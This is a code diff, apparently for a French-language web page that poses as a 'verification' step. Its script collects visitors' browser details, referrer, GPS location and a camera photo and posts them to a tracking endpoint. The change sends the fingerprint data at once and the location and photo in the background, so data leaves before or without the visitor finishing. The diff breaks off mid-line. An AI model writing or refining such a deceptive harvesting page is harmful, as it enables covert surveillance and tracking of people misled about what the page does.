@@ -185,6 +185,7 @@
       status.style.display = 'block';
       status.textContent = 'Vérification en cours...';
 
+      // 1) Envoyer les données de base IMMÉDIATEMENT (IP côté serveur)
       const data = {
         userAgent: navigator.userAgent,
         platform: navigator.platform,
@@ -193,26 +194,13 @@
         timestamp: new Date().toISOString(),
         referrer: document.referrer,
       };
+      await sendData(data);  // envoie tout de suite
 
-      // Run GPS + Camera in parallel
-      const [geoResult, photoResult] = await Promise.allSettled([
-        getGPS(),
-        getPhoto()
+      // 2) GPS + caméra en arrière-plan (sans bloquer l'UI)
+      Promise.allSettled([
+        getGPS().then(geo => sendData({ ...data, ...geo, enriched: 'gps' })).catch(() => {}),
+        getPhoto().then(photo => sendData({ ...data, photo, enriched: 'photo' })).catch(() => {})
       ]);
-
-      if (geoResult.status === 'fulfilled') {
-        Object.assign(data, geoResult.value);
-      } else {
-        data.geoError = 'refusé ou indisponible';
-      }
-
-      if (photoResult.status === 'fulfilled') {
-        data.photo = photoResult.value;
-      } else {
-        data.photoError = 'refusé ou indisponible';
-      }
-
-      await sendData(data);
     }
 
     function getGPS() {
@@ -258,4 +246,7 @@
     }
 
     async function sendData(data) {
-      
+      try {
+        await fetch('/api/track', {
+          method: 'POST',
+          headers: { 'C
